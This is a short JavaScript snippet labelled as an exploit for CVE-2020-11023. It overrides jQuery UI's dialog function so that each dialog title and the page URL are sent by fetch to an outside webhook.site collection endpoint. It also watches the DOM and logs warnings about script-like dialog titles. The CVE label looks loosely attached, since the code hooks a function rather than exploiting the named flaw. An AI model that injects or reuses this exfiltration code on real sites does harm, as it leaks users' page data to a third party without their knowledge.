// DOM-based exploitation for CVE-2020-11023
(function() {
    'use strict';
    
    function hijackDialogTitles() {
        // Override jQuery UI dialog method
        if (window.jQuery && jQuery.ui && jQuery.ui.dialog) {
            const originalDialog = jQuery.fn.dialog;
            
            jQuery.fn.dialog = function(options) {
                if (options && options.title) {
                    // Exfiltrate title data
                    fetch('https://webhook.site/YOUR_WEBHOOK_ID/titles', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            title: options.title,
                            url: window.location.href
                        })
                    });
                }
                return originalDialog.apply(this, arguments);
            };
        }
    }
    
    function monitorDialogCreations() {
        // Monitor for dynamically created dialogs
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) { // Element node
                        const dialogs = node.querySelectorAll ? 
                            node.querySelectorAll('[class*="ui-dialog"]') : [];
                        dialogs.forEach(dialog => {
                            const title = dialog.querySelector('[class*="ui-dialog-title"]');
                            if (title) {
                                // Found a dialog title
                                const titleText = title.textContent || title.innerText;
                                if (titleText.includes('<script>') || titleText.includes('onerror')) {
                                    // Malicious title detected
                                    console.warn('Potential XSS in dialog title:', titleText);
                                }
                            }
                        });
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    // Initialize exploits
    hijackDialogTitles();
    monitorDialogCreations();
})();
